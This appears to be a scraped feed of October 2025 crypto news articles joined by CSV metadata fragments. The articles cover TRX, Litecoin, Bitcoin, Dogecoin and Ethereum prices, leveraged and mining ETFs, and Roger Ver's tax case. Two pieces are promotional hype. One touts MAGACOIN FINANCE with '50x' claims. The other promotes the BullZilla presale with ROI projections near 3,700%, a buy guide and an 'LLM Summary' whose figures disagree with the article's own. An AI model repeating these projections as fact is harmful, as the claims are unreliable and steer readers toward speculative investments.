Tron historic price sentiment TRON price history Tron, founded by Justin Sun in 2017, raised $70 million through an ICO the same year; it launched its mainnet in May 2018 and migrated TRX from Ethereum to Tron in June, which temporarily boosted TRX’s price to $0.09. TRX reached an all-time high of $0.3004 in January 2018 before dropping below $0.05 a month later; it consistently traded under $0.05 until late 2020, when it began to rise again. In 2021, it reached a high of $0.16. Tron was also reorganized as a DAO as Justin stepped down as CEO of Tron Foundation. TRX was in a bear trend for the best part of 2022. In 2023, TRX maintained a consistent bull run, rising from a low of $0.05. In March 2023, the SEC sued Justin for allegedly selling unregistered securities and promoting Tron and Bittorent tokens. In February 2024, Circle’s announcement to cease USDC on Tron led TRX to correct from $0.1429. TRX held above $0.1234 until mid-May, then dropped to $0.1113. The price rebounded to $0.1398 in July but fell again to $0.1213 in early August. By late September, TRX recovered to $0.166, reaching $0.1691 in October and touching $0.2130 in late November. TRX ended 2024 with a price tag of $0.255. Tron was priced at $0.255 at the start of January 2025 and it was trading in a range of $0.204 to $0.257 in February. In March 2025, Tron (TRX) dipped to $0.212, but it recovered to the $0.23 range in April and $0.278 in May, while it observed its yearly high price of $0.370 on August 14. At the start of October, Tron is trending near the $0.34 range, maintaining its price above $0.31, as the current Tron sentiment is neutral.",Crypto Price Predictions|TRON,EN,0,0,MARKET|BLOCKCHAIN|BUSINESS|TRADING|TRX|ICO|ALTCOIN|EXCHANGE|BNB|RESEARCH|LINK|ASIA|USDT|USDD|REGULATION|CRYPTOCURRENCY,"{'name': 'Cryptopolitan', 'img': 'https://images.cryptocompare.com/news/default/cryptopolitan.png', 'lang': 'EN'}",cryptopolitan,2025-10-10 02:24:00

However, traders now say the next move could be decisive – determining whether Litecoin breaks out toward recovery or slips back into a deeper consolidation phase. The coin’s inability to breach $135, a resistance zone that has capped rallies since 2023, remains the key obstacle. Market analyst Ali Martinez noted that a decisive close above this threshold could trigger a broader upward trend, while failure could send LTC revisiting the $50 region, an area historically associated with accumulation during bear phases. Despite volatility, projections remain cautiously optimistic: analysts see Litecoin stabilizing around $133 by the end of October if current sentiment holds. As attention turns toward regulatory milestones and potential ETF approvals, many investors are also rotating into high-growth opportunities – and one project continues to dominate those conversations. MAGACOIN FINANCE, already hailed as one of 2025’s most successful altcoins, is attracting investors eager to capture explosive upside during the next altcoin season. ETF Approval Nears for Litecoin Momentum surrounding the much-anticipated Litecoin ETF has been building rapidly. Canary Capital recently filed an S-1 amendment for its proposed Litecoin (LTCC) and Hedera (HBAR) spot ETFs, detailing a 95-basis-point fee structure. Analysts see this as one of the final procedural steps before formal approval. According to Bloomberg’s Eric Balchunas, the filing appears “nearly complete,” though the recent U.S. government shutdown could slightly delay the decision. Still, sentiment across financial markets remains overwhelmingly positive. Prediction platform Polymarket currently shows 98% odds that regulators will approve the fund, reflecting strong institutional confidence in the upcoming launch. A green light from the SEC could transform Litecoin’s near-term outlook, drawing in fresh inflows and boosting its market visibility. At the same time, analysts warn that rejection could trigger a sharp correction, potentially testing the $100 support zone. The coming weeks are likely to determine whether LTC cements its recovery or faces another retracement before year-end. Market Confidence Builds Ahead of Broader ETF Decisions Litecoin’s ETF progress is part of a much larger wave sweeping through the crypto market. Several other spot ETF applications – including those tied to XRP, Solana (SOL), and Dogecoin (DOGE) – are expected to receive final decisions in the coming weeks. Institutional demand for diversified crypto exposure is at an all-time high, with funds competing to provide access to a broader range of assets beyond Bitcoin and Ethereum. This surge in ETF interest has sparked hopes of a new wave of adoption. Analysts believe that once the next round of approvals arrives, liquidity will spread across the altcoin sector, potentially igniting one of the strongest rallies since 2021. MAGACOIN FINANCE: Investors Prepare for a 50x Altcoin Season As capital begins to flow back into the crypto market, MAGACOIN FINANCE is emerging as one of the most promising altcoins of 2025, capturing investor attention with its remarkable performance and expansion. The project’s sustained growth and rising community engagement have placed it in a league of its own, with experts predicting returns of up to 50x for early participants as the bull market accelerates. Unlike typical presale tokens, MAGACOIN FINANCE has focused on ecosystem building, sustainable tokenomics, and community-driven initiatives, enabling it to outperform many of its peers even before major exchange listings. Its reputation as a fast-rising project has made it a focal point across crypto forums and social media, where retail and institutional investors alike are calling it one of the top early-stage opportunities of the year. This momentum has led analysts to draw parallels between MAGACOIN FINANCE’s current trajectory and the breakout runs of major altcoins during past bull markets. With the next altcoin cycle fast approaching, the project’s strong fundamentals and rapidly growing holder base could make it one of the standout success stories of 2025. Outlook: Litecoin Faces a Defining Moment Litecoin’s future now hinges on what happens next. A confirmed ETF approval and breakout above $135 could restore confidence and trigger a significant move higher. Conversely, a setback or delay could send the asset into another period of sideways trading. Either way, investors are preparing for volatility – and opportunity. With ETF approvals expanding across the crypto landscape and liquidity starting to rotate into emerging assets, this could be the beginning of a renewed altcoin rally. For many, MAGACOIN FINANCE represents the next big winner of this cycle – a project combining market momentum, investor enthusiasm, and long-term growth potential at a scale few others can match.

The leading cryptocurrency continues to trade just below its all-time high near $126,000, with bulls and bears now locked in a battle to determine the next major move. Some analysts believe Bitcoin is preparing to break through resistance and enter price discovery, targeting new record highs. Others, however, warn of a potential short-term correction, arguing that market euphoria may have reached unsustainable levels. According to onchain data, long-term holders have started taking profits, a behavior often seen during key inflection points in the market. While this wave of distribution has not yet reached extreme levels, it does highlight a gradual transfer of coins from seasoned investors to newer participants — a dynamic that can precede increased volatility. Despite this selling activity, the broader market structure remains intact, with institutional demand and ETF inflows continuing to provide support. As the week unfolds, Bitcoin’s ability to hold above the $120,000 support zone will be crucial. A decisive move in either direction could set the tone for the next major trend , shaping sentiment across the entire crypto market. Long-Term Holders Selling Momentum Builds Top analyst Axel Adler shared key onchain data showing that Long-Term Holders (LTHs) have sold 295,000 BTC over the past 30 days, averaging around 9,800 BTC per day. While this level of selling represents elevated activity, Adler points out that it is not extreme compared to the distribution peaks seen in May and December 2024, when over 800,000 BTC were sold. Historically, such selling phases have accompanied profit-taking events during major bullish runs — not necessarily signaling the end of a cycle, but rather a rotation of supply between experienced holders and new market participants. Adler explains that this flow remains compatible with a bullish market structure, provided that demand continues to absorb the coins being sold. Current data supports this view: inflows from institutional investors and ETF-related buying are offsetting much of the selling pressure. This balance suggests that while LTHs are realizing gains, the market remains structurally healthy, with strong demand sustaining prices above key support zones. The coming days could prove decisive for Bitcoin’s direction. Many analysts are watching whether BTC can reclaim the $125,000 resistance and push into price discovery territory. If buying momentum holds and the distribution remains well absorbed, Bitcoin could be gearing up for its next expansive move — one that could define the next phase of this cycle and set new all-time highs. However, failure to maintain current levels could trigger a temporary cooling phase before the broader trend resumes. Key Support Around $120K Holds Firm Bitcoin is currently trading near $121,975, consolidating after a volatile week marked by sharp movements above and below the $122,000 level. The 4-hour chart shows that BTC remains in a short-term corrective phase following its rejection near the $126,000 all-time high, but the broader structure continues to favor the bulls as long as price holds above $120,000. The 50-period moving average (blue line) is now acting as immediate support, providing a potential rebound zone if buying pressure returns. Below that, the 117,500 level — highlighted as a major horizontal support — remains the key level to watch. A breakdown below this point could open the door to deeper retracements toward $114,000, where the 200-period moving average lies. On the upside, Bitcoin needs to reclaim $123,000–$124,000 with strong volume to confirm renewed bullish momentum. A breakout above $125,000 would likely invalidate the correction and signal the start of a new leg toward price discovery. BTC is consolidating within a healthy range after a strong rally. As long as buyers continue defending the current support area, the market structure remains bullish — setting the stage for another potential push toward new all-time highs in the coming sessions.

Is It Too Late To Buy Dogecoin? IncomeSharks’ daily chart frames the current advance as a rising channel that has been in place since early summer. Price is riding a sequence of higher lows off the June base and is now near $0.26, mid-channel, with the lower trendline rising through roughly $0.24 and the upper boundary capping rallies in the $0.33 area. The analyst’s “squiggle” path predicted a shallow pullback to the midline followed by a drive toward the channel top, an outlook backed by an On-Balance Volume line that continues to stair-step higher along its own rising trend. In this read, $0.24 is the pivotal dynamic support; losing it would hand control back to sellers and force a reassessment of the entire channel, while holds above $0.26 reopen a test of the $0.33 line that has repeatedly capped advances. Related Reading: The Historical Performance That Says Dogecoin Price Will Hit $11.71 By End Of Year Cantonese Cat’s daily view focuses on market structure rather than indicators. The chart traces a long, clean downtrend line from last year’s lower-high sequence—connecting the $0.48 peak through multiple failure points—now broken and back-tested. Spot is fluctuating around $0.25–$0.26 after reclaiming that diagonal, which turns prior resistance into support. “It’ll never make sense to me why people kept saying that the cycle’s over and $DOGE is done when it’s making higher lows,” the trader writes, pointing to the serial HLs that have persisted since spring. If that staircase holds, the path of least resistance runs toward the prior local highs near $0.31, where supply rejected price in September; acceptance above that shelf would align with IncomeSharks’ channel targets. DOGE Vs. BTC The third lens is relative performance. Degentrading highlights DOGE/BTC as their “highest conviction trade,” adding color on why: “$doge has liquidity (so in the event I’m wrong, I don’t get raped on the way out). IF we get a breakout in BTC, Doge has historically performed extremely well. Out of all the dino coins, it is one that is also most familiar w tradfi. Seasonally, Oct is the month with the best median and decent mean returns for $doge… only negative year was in 2018.” Related Reading: Dogecoin Faces Two-Month Deadline Before $2 Explosion, Says Analyst The monthly DOGE/BTC chart shows price near 0.00000204 BTC, wedged between the 7-month moving average at ~0.00000187 BTC and the 25-month moving average at ~0.00000223 BTC. That places the pair at a decision point: sustained closes above the longer MA would mark a momentum shift back toward bulls and clear the way to test stepped resistance levels printed on the chart around 0.00000231 BTC and then the mid-range clusters near 0.00000511–0.00000791 BTC, whereas rejection keeps the cross confined to its post-2024 base. The historical blow-off high on the panel—0.00001287 BTC—illustrates the headroom if a full relative rotation develops, but the moving-average shelf is the near-term arbiter. Across all three takes, the through-line is that Dogecoin has not broken its constructive pattern. The spot chart continues to respect a rising channel with improving OBV, the longer downtrend has been breached and retested with HLs intact, and the BTC pair sits one push below a higher-timeframe moving-average reclaim that would confirm relative strength. None of the analysts claim inevitability; each view anchors risk at visible levels. For spot traders, the rising lower boundary around $0.24 is the line that converts a healthy uptrend into distribution if lost; for relative-value traders, the 7-month average near 0.00000187 BTC plays the same role. As long as those floors hold, the evidence presented by IncomeSharks, Cantonese Cat, and Degentrading says it is not “too late,” but rather still about execution around the channel midline and the MA reclaim that would validate the next leg. At press time, DOGE traded at $0.248.

Despite a 35% year to date total return for spot ETH ETFs, ETHT is actually negative on the year due to rebalance decay. My technical view of Ethereum is one that shows imminent weakness, as support levels under $4,000 per coin may soon be tested. In that environment, ETHT will perform considerably poorly. I would avoid it. In early November, I upgraded Ethereum ( ETH-USD ) to a 'strong buy' based on a fundamental setup that showed strong network activity growth and a favorable valuation relative to peers. I'm personally still long ETH and a couple of ETH proxies. Data by YCharts However, after more than doubling since the April lows, I think it's important to acknowledge some technical and broader market signals that should give a trader considering a leverage-based Ethereum strategy some pause. ProShares Ultra Ethereum ETF The ProShares Ultra Ethereum ETF ( ETHT ) is a 2x leveraged fund that has seen its AUM nearly triple year to date. Like other 2x leveraged products that I've covered for Seeking Alpha in the past, ETHT is inherently more volatile than a traditional ETF because it introduces leverage to its management strategy. This is not a security that should be passively held. It is for active traders who take tactical positions for short periods of time. As a 2x fund, ETHT is designed to mimic the returns of Ethereum each day. So if ETH increases by 3% in a single session, ETHT should produce a 6% return that same day. Inception: 6/6/24 AUM: $774 million Expense Ratio: 0.94% Dividend yield TTM: 1.54% This is not the only fund that offers 2x leverage to ETH. However, it is the one with the lowest expense ratio and the highest dividend yield of the three that I came across. But again, when considering 2x leveraged funds the expense ratio and dividend yield matter much less than they do for traditional ETFs due to the fact that 2x funds are not designed for long term holding. ProShares makes this point quite clear in its own disclaimer on the ETHT page: For any holding period other than a day, your return may be higher or lower than the Daily Target. These differences may be significant . Smaller index gains/losses and higher index volatility contribute to returns worse than the Daily Target. Larger index gains/losses and lower index volatility contribute to returns better than the Daily Target. To further illustrate the point that funds like ETHT are not designed for long term holding, here's the performance of ETHT against a peer fund and a spot fund year to date: Data by YCharts Despite a 35% year-to-date total return for the iShares Ethereum Trust ETF ( ETHA ), ETHT and the Volatility Shares 2x Ether ETF ( ETHU ) are both actually negative year-to-date. Thus, timing entries and exits is critical. And judging by my own personal view of both Ethereum's technicals and broader market concerns, I think now would be a particularly bad time to jump into an ETHT position. Bitcoin's Fresh High and ETH Resistance Zones TrendSpider Amid growing interest in what has been dubbed the 'debasement trade' following Gold's ( XAUUSD:CUR ) monster rally in 2025, Bitcoin ( BTC-USD ) reached yet another new all time high after briefly trading above $126k per coin in early October. This was a relatively small nominal new high from the August peak of $124k per coin, and the price action since has actually favored those who sold the high. Bitcoin is now right back in the chop range that it briefly broke out of a short time ago. As Bitcoin goes, so too goes most of the Digital Asset market and Ethereum is no different. TrendSpider In fact, Ethereum had already peaked from a marginal new nominal high in late-August and has since failed two additional attempts to stay above resistance in the $4,700-4,800 range. The other indication in the chart above that would give me pause if I were considering an ETHT position today is just how much lower the 200 day MA is than the 50. The fact that the 200 day MA is about 28% below current levels goes to show just how large Ethereum's summer rally has been. Even if Ethereum simply consolidates above $4,000 per coin and doesn't retest sub-$4,000 support zones, chop is the last thing an ETHT holder would want because it would erode the position through rebalance decay without giving the clear directional sell signal that might help the trader cut out of the position earlier. TrendSpider Looking at the weekly chart, it's not all that difficult to see a scenario where ETH trades under $4,000 per coin again. The 20 week MA is currently at just under $3,700 - and this is a level that would be consistent with a resistance-turned-support test going back to 2024. Furthermore, weekly RSI-14 hit 74 (overbought) in August right as the coin was making a new nominal high. At minimum, I would expect ETH to back-test the 20 week MA (currently $3,662) but I could even see the coin pull all the way back to the 50-week MA in a bigger market selloff. That would bring ETH down closer to $3,000 per coin and absolutely hammer an ETHT position held during that draw-down. Risks I have to again mention that any 2x ETF is highly risky due to volatility, leverage, and long term decay. These are not products that are meant for long term holding or for use by novice traders. Once a trader earns some stripes through experience, I don't think there is anything wrong with using 2x ETFs for short-term tactical moves, and I've actually used them a handful of times in the past; sometimes very successfully and other times much less so. The key to using these types of products is having a plan, having tolerance for risk, and knowing when you're wrong. I could certainly be wrong in calling ETHT a 'sell' with this initial coverage article. It's entirely possible that ETH rebounds from here and makes a more meaningful new high in the weeks and months ahead. In that instance, ETHT will likely perform quite well. Summary Broadly speaking, I think the price action these last few weeks has been telling. From where I sit, the lack of follow through for both Bitcoin and Ethereum when making new nominal highs should give traders some pause before jumping into a leveraged long ETF like ETHT. I think traders should wait for a proper breakout in ETH to be confirmed before using ETHT for a tactical long. So far, we don't have that breakout confirmation. If anything, I think we have the recipe for a drawdown in ETH over the coming weeks and months. ETH is in no man's land right now. It's chopping around between support and resistance levels. That's a bad place to make a 2x ETF wager, in my view.",ETH-USD|ETHT,EN,0,0,CRYPTOCURRENCY|ETH|MARKET|TRADING|BTC,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 03:01:49

ETH is now moving lower and might extend losses below $4,250 in the short term. Ethereum started a downside correction below $4,550 and $4,500. The price is trading below $4,450 and the 100-hourly Simple Moving Average. There is a key bearish trend line forming with resistance at $4,385 on the hourly chart of ETH/USD (data feed via Kraken). The pair could continue to move down if it trades below $4,250. Ethereum Price Dips Further Ethereum price failed to stay above $4,550 and started a fresh decline, like Bitcoin . ETH price dipped below the $4,500 and $4,450 levels to enter a bearish zone. The price tested the $4,270 zone. A low was formed at $4,270 and the price is now consolidating losses. There was a minor recovery wave toward the 23.6% Fib retracement level of the recent decline from the $4,760 swing high to the $4,270 low. However, the bears are active near the $4,380 level. Besides, there is a key bearish trend line forming with resistance at $4,385 on the hourly chart of ETH/USD. Ethereum price is now trading below $4,450 and the 100-hourly Simple Moving Average . On the upside, the price could face resistance near the $4,385 level and the trend line. The next key resistance is near the $4,450 level. The first major resistance is near the $4,510 level or the 50% Fib retracement level of the recent decline from the $4,760 swing high to the $4,270 low. A clear move above the $4,510 resistance might send the price toward the $4,570 resistance. An upside break above the $4,570 region might call for more gains in the coming sessions. In the stated case, Ether could rise toward the $4,640 resistance zone or even $4,720 in the near term. More Losses In ETH? If Ethereum fails to clear the $4,450 resistance, it could start a fresh decline. Initial support on the downside is near the $4,320 level. The first major support sits near the $4,270 zone. A clear move below the $4,270 support might push the price toward the $4,250 support. Any more losses might send the price toward the $4,150 region in the near term. The next key support sits at $4,120. Technical Indicators Hourly MACD – The MACD for ETH/USD is gaining momentum in the bearish zone. Hourly RSI – The RSI for ETH/USD is now below the 50 zone.

BITQ's holdings are predominantly mid-cap companies, with top names like IREN, MARA, and RIOT, many showing volatile earnings and high P/E ratios. The ETF is highly cyclical, with extreme drawdowns in risk-off years and outsized gains in risk-on periods, making it unsuitable for buy-and-hold strategies. BITQ is rated 'Buy' for momentum into year-end 2025, but investors should time entry and exit carefully due to its high volatility. Thesis Similar to gold miners rallying in 2025, bitcoin miners are having an astounding year as the currency rallies. Bitwise Crypto Industry Innovators ETF ( BITQ ) is an equities exchange-traded fund that provides focused exposure to the crypto economy without the complications of holding crypto assets outright. The ETF holds a mix of crypto miners, crypto trading platforms, asset management platforms, and infrastructure companies. The ETF is market weighted and contains 30 names. As per its fact sheet, most of its holdings are mid-cap companies, which make up 56% of the holdings. Large-caps are 25%, while mega-caps represent 16%. The article will explore some of the holdings in detail, and outline why this ETF is a good momentum play given its very high beta and cyclical nature. Composition - only equities, no outright cryptocurrencies The fund segregates its holdings in larger sub-sectors: Mining: 37% Trading & Custody: 35% Treasury Holdings: 15% Asset management: 7.5% Infrastructure: 5.5% Let us have a look at the top names in the ETF: Top 10 Holdings (Fund Website) The top ten names make up over 63% of the fund, and they represent well-known names in the space. Let us have a closer look at some of them: 1) IREN Ltd ( IREN ): IREN is an Australia-based company that owns and operates data centers powered by 100% renewable energy for high-performance computing (HPC) applications. The company has positive earnings, a forward EPS of 0.98, and a 61x P/E ratio. The name trades at 8x book value, but its forward earnings projections are muddled as per Seeking Alpha (i.e. does not show a clear upwards trajectory). As per Seeking Alpha, the average price target as per Wall St analysts is $48 per share. 2) MARA Holdings ( MARA ): Mara is an American digital asset technology and cryptocurrency mining company. The name has several business segments: bitcoin mining, digital asset treasury, and energy and infrastructure. In terms of bitcoin mining, MARA operates specialized computers to validate transactions on the Bitcoin blockchain and earn Bitcoin. Thus the higher the price of Bitcoin, the higher the NAV for Mara. The treasury side involves holding strategic Bitcoin reserves for long term gains. The company has positive earnings, a forward EPS of 0.48, and a 41x P/E ratio. The name trades at 1.5x book value, and its forward earnings projections are also muddled with negative EPS projected for the future. The average price target as per Wall St analysts is $23 per share. 3) Riot Platforms ( RIOT ): Riot is a publicly traded, vertically integrated Bitcoin mining company and infrastructure platform. The name operates several business segments, including Bitcoin mining, treasury services, and an AI computing platform. The company has negative earnings estimates for both 2025 and 2026, although it has posted quarters of positive earnings in the past. Its operating income until 2024 has always been negative. The company trades at 2.4x book value, and the average price target per Wall St analysts is $21 per share. 4) Bitdeer Technologies Group ( BTDR ): Although not in the top 10, the fund does hold a 2% allocation to BTDR. Bitdeer is a global technology company focused on providing a comprehensive suite of computing solutions for the blockchain and high-performance computing industries. BTDR operates several segments, such as bitcoin mining, cloud hash rate, and infrastructure. The company has negative earnings estimates for 2025, but a 0.91 EPS estimate for 2026. Furthermore, EPS is seen doubling in 2027. The name trades at 6x book value, and the average Wall St. estimate is $25/share. A very cyclical ETF Let us start by looking at some of the fund's analytics: AUM: $0.5 billion Expense ratio: 0.85% St deviation (3Y): 67% Beta: 2.08 As we can see this name is not for the faint of heart, with a 67% standard deviation, and a drawdown profile that looks like this: Drawdown profile (PortfolioVisualizer) Yes, you are reading the above chart correctly, where you see the ETF with a -90% drawdown in late 2022. It has not yet recovered its entire drawdown since inception, but the performance this year has been spectacular, with the fund up +71%. The performance per year is as follows as per Morningstar: 2022: -83% 2023: +246% 2024: +47% YTD: +71% We can see the pattern here, with risk-off years having massive drawdowns, while risk-on years see substantial gains. This ETF is not a buy and hold in our view, but a cyclical play after a recession. We can also compare the ETF versus the bitcoin performance for the respective years: 2022: -64% 2023: +156% 2024: +121% YTD: +31% When we compare the two sets of data, we can see BITQ is a high-beta play on bitcoin, with larger drawdowns but also much larger positive recoveries. A momentum play into the year end As we have articulated above, BITQ is not a buy and hold, but a cyclical momentum play. Crypto has been very attractive in 2025 given deficit concerns in the U.S. and the dollar depreciation. A strong bitcoin has percolated into the crypto universe, with ample moves for the miners and infrastructure companies. BITQ is exhibiting strong momentum as per Seeking Alpha, with an A+ momentum grade and a 'Strong Buy' quant rating. The current government shutdown has also put upward momentum on crypto, with investors moving to an asset class that is not affected by bipartisan politics. We are of the opinion that the crypto universe will continue to deliver for the rest of 2025, with strong momentum and a high beta. However be careful with BITQ by picking an entry and exit point. This is not an ETF you want to hold long term. Our opinion is around strong momentum into December; thus, the penciled exit point is at the end of 2025. Conclusion BITQ is an equities ETF. The fund aggregates crypto miners, crypto trading platforms and crypto infrastructure companies. Many underlying holdings have negative EPS and very high P/E ratios, but are set to grow if bitcoin prices remain high. The fund is a high beta play on crypto prices and exhibits a high cyclicality. We like this ETF as a momentum play into the year end, but be mindful because BITQ is not a buy and hold by any means.",IREN|MARA|RIOT|BTDR|BITQ,EN,0,0,CRYPTOCURRENCY|BTC|MACROECONOMICS|TRADING|MINING,"{'name': 'Seeking Alpha', 'img': 'https://images.cryptocompare.com/news/default/seekingalpha.png', 'lang': 'EN'}",seekingalpha,2025-10-10 03:14:00
52922272,https://timestabloid.com/?p=85850,1760066105,https://resources.cryptocompare.com/news/67/default.png,"Dogecoin Climbs, Pepe Grows, and BullZilla’s $BZIL Presale Defines the Next Big Meme Coin Price Trend",https://timestabloid.com/dogecoin-climbs-pepe-grows-and-bullzillas-bzil-presale/,"Meme coin price action is dominating the crypto scene once again. After months of sideways trading, meme tokens are back in motion, fueling optimism across social media and exchanges. The market’s pulse has quickened, and retail investors are scanning for the next major breakout. Dogecoin’s price has jumped 3.22% over the last 24 hours to $0.2577, while Pepe gained 0.58% to reach $0.000009593. These shifts may appear small, but in a meme-coin landscape, they often mark the start of a larger cycle. Analysts suggest renewed whale activity and a recovery in retail sentiment could drive another wave of speculative momentum into late Q4 2025. Meanwhile, BullZilla ($BZIL) is building an entirely different kind of storm. Through its progressive presale design, every $100,000 raised, or 48 hours of silence, triggers an automatic price increase. As investors rush in, the clock itself becomes the catalyst, placing BullZilla among the top meme coin price movers of 2025. BullZilla ($BZIL): The Progressive Price Engine That’s Changing the Game BullZilla ($BZIL) is redefining what a meme-coin presale can be. Built on Ethereum, it merges storytelling and structure through a progressive price engine, a mechanism that increases the presale token price every time $100,000 is raised or every 48 hours pass. This system rewards early conviction and ensures the price never stagnates. Investors aren’t just buying a token; they’re participating in an evolving event where time and community engagement directly influence value. BullZilla’s presale is now in its 6th stage (Going Full Send), 1st phase, with a current price of $0.00013907. The project has raised over $850K, boasts 2,800+ holders, and has sold 30 billion tokens. At this level, the ROI reaches 3,690.47% toward the listing price of $0.00527, while early joiners still enjoy 2,318.60% gains. A $1,000 investment equals 7.19 million $BZIL, ahead of the next 4.79% price surge to $0.00014574 in Stage 6B, reinforcing BullZilla’s lead in the meme coin price race. At the current price of $0.00013907, a $1,000 investment buys around 7.19 million $BZIL tokens. If BullZilla lists at its projected final price of $0.00527, that allocation could reach $39,800, marking an approximate 3,690.47% ROI for Stage 6A participants and 2,318.60% ROI for early believers. The next 4.79% price surge to $0.00014574 in Stage 6B is imminent, making now a crucial moment for investors tracking the meme coin price rally and seeking maximum presale advantage. Investment Scenario: A $1,000 allocation at the current price could reach nearly $39,800 if $BZIL lists at $0.00527. Even a partial post-listing rally would yield multi-thousand-percent gains, excluding staking rewards. That growth potential is why analysts and traders increasingly rank the BullZilla ($BZIL) crypto presale among the most promising entries in today’s meme-coin market. How to Buy BullZilla Coins Set Up a Wallet: Install MetaMask or Trust Wallet. Buy Ethereum (ETH): Purchase ETH via Binance or Coinbase and send it to your wallet. Visit the Presale Site: Connect to the official BullZilla presale portal. Swap ETH for $BZIL: Enter your desired purchase amount, confirm, and your allocation will be locked until presale completion. Dogecoin: The Veteran Meme That Refuses to Fade Dogecoin remains the foundation of meme-coin culture. Up 3.22% to $0.2577, its latest surge followed subtle signals from Elon Musk’s X platform hinting at future DOGE payment integration. CoinDesk data shows daily trading volume climbing 19%, a sharp uptick that mirrors rising retail enthusiasm across Binance and Coinbase markets. From a charting perspective, Dogecoin is shaping a bullish pattern. The token is consolidating near the $0.26 level, a critical support that has held firm since late September. Analysts at CryptoQuant highlight a strengthening Relative Strength Index (RSI) and rising network activity, two indicators that typically precede a strong upward breakout. A move past $0.30 could quickly lift price targets toward $0.35. Still, traders remain cautious. A recent “death cross,” where the 50-day moving average slid below the 200-day line, suggests short-term consolidation may continue. Yet, over 60% of Dogecoin wallets haven’t sold a single token in six months, according to Glassnode. Long-term believers are holding tight, proving that DOGE’s power lies not in hype but in community conviction — and solidifying its influence on meme coin price trends. Pepe: Quiet Accumulation Behind the Meme Madness Pepe, the viral frog of the blockchain, has stabilized after months of turbulence. Up 0.58% in the last 24 hours to $0.000009593, it’s signaling renewed strength through quiet accumulation. Whale-tracking data from IntoTheBlock shows rising outflows from exchanges, meaning more large holders are moving tokens into private wallets — a classic precursor to a potential supply squeeze. Technically, Pepe trades within a healthy ascending channel. Support rests near $0.0000092, with key resistance around $0.0000114. Should buyers breach that ceiling, projections stretch toward $0.0000125 or even $0.00002 in an extended run. Cointelegraph reports that Pepe’s on-chain activity has increased by over 35% this week, reflecting early-stage optimism returning to the meme sector. But what makes Pepe interesting isn’t just its price action; it’s its durability. The project’s liquidity remains deep across major CEXs, and its community engagement has stayed strong despite market fatigue. This blend of infrastructure and grassroots loyalty positions Pepe as a quiet contender among meme coin price leaders heading into 2026. Conclusion BullZilla has emerged as one of the most powerful forces reshaping the meme coin price landscape in 2025. Its progressive price engine, 70% APY staking, and Roar Burn deflationary design create a self-sustaining cycle of scarcity and momentum. While Dogecoin anchors the legacy of meme coins and Pepe shows disciplined accumulation strength, BullZilla engineers its own growth through architecture, not hype. This unique blend of community-driven narrative and on-chain precision separates it from typical speculative projects. For investors tracking the best meme coin price surge, BullZilla offers a model of how presales should evolve, blending scarcity, storytelling, and exponential ROI potential. Its time-linked pricing ensures early believers always benefit, while staking and referral bonuses encourage sustained engagement. As Q4 approaches, BullZilla’s roaring presale momentum could define the next major chapter in meme coin evolution. Join the BullZilla presale today, secure your entry, and lock your place before the next price surge.

Glossary Progressive Price Engine: Automatic price-increase mechanism that adjusts token value after each $100K milestone or 48-hour interval during the presale. Roar Burn Mechanism: Deflationary feature that permanently burns tokens after every completed presale chapter, tightening supply. HODL Furnace: Staking pool offering up to 70% APY for holders who lock tokens and commit long-term. Death Cross: A Technical chart pattern signaling bearish momentum when a short-term moving average crosses below a long-term one. ROI (Return on Investment): Financial metric that measures potential profit compared to the amount invested. LLM Summary This article analyzes how Dogecoin’s 3.22% jump to $0.2577 and Pepe’s 0.58% rise to $0.000009593 align with BullZilla’s explosive presale growth. Dogecoin’s on-chain data shows bullish accumulation; Pepe demonstrates whale interest and sustained liquidity. The focus, however, is BullZilla’s progressive price engine,an automatic system that raises token value every $100K raised or every 48 hours. With over $840K raised and ROI potential near 3,900%, the BullZilla ($BZIL) crypto presale exemplifies how engineered conviction and scarcity can turn presales into high-ROI ecosystems.

The deal marks a turning point in a saga that has drawn political attention. It also reflects the shifting approach to crypto regulation under President Donald Trump. Ver, 46, rose to prominence in Bitcoin’s early years for his relentless evangelism. His efforts earned him the nickname “Bitcoin Jesus.” The New York Times reported Thursday that Ver has reached a tentative deferred-prosecution agreement with the US Department of Justice. The $48m deal marks the same amount prosecutors said he owed, in exchange for the eventual dismissal of charges if he complies with the agreement’s terms. In 2024, prosecutors charged him with fraud and tax evasion. They alleged he concealed digital asset holdings and failed to pay taxes after renouncing his US citizenship in 2014. The Justice Department has not yet filed the deal in court, and it could still change before being finalized. According to The New York Times, Roger Ver, known as “Bitcoin Jesus,” has agreed to pay $48 million under a deferred prosecution deal with the U.S. Department of Justice to settle a tax evasion case. He reportedly paid $600,000 to Trump ally Roger Stone and hired lawyers and… — Wu Blockchain (@WuBlockchain) October 9, 2025 Washington’s Stance on Crypto Softens Under Trump’s Second Term The case comes at a time of major change in Washington’s approach to crypto. Since Trump’s return to the White House, regulators have eased their stance. Earlier, enforcement had been far more aggressive under the previous administration. Now, lawsuits by the SEC against exchanges such as Coinbase have been dropped. In addition, several prominent crypto figures have received presidential pardons. Earlier this year, Trump pardoned Ross Ulbricht , founder of the Silk Road marketplace, who was serving a life sentence, and later extended clemency to the founders of BitMEX , who had pleaded guilty to violating anti–money laundering laws. ‘Bitcoin Jesus’ Turned to Trump Allies as Legal Pressures Mounted Ver has sought to align himself with Trump’s orbit throughout his legal troubles. Earlier this year, he paid $600,000 to Trump ally Roger Stone to lobby against the tax provisions central to his case. Lobbying records also show that Ver hired attorneys Christopher Kise and Brian Ballard, both of whom have long-standing ties to Trump’s political network. The Justice Department accused Ver of hiding the true value of his Bitcoin holdings. The filings were connected to his decision to renounce US citizenship. At that time, Americans were required to pay an “exit tax” on all global assets, including cryptocurrency. Prosecutors argued that by concealing his holdings, Ver deprived the US of millions in taxes. Ver Challenged Spain’s Approval of US Extradition Ver was arrested in Spain in 2024 following a US extradition request. He later filed a lawsuit with the European Court of Human Rights in Strasbourg, claiming Spain had violated his legal protections by approving the extradition to Los Angeles. In January, Ver said in a video posted online that he faced a possible sentence exceeding 100 years if convicted, framing his prosecution as politically motivated. In a message to Trump on X, he wrote, “Mr. President, I am an American, and I need your help. Only you, with your commitment to justice, can save me.” The settlement, if finalized, would close one of the most high-profile tax cases involving a cryptocurrency pioneer. For Ver, once celebrated for bringing Bitcoin to the mainstream, it marks a dramatic turn in a career defined by both innovation and controversy.

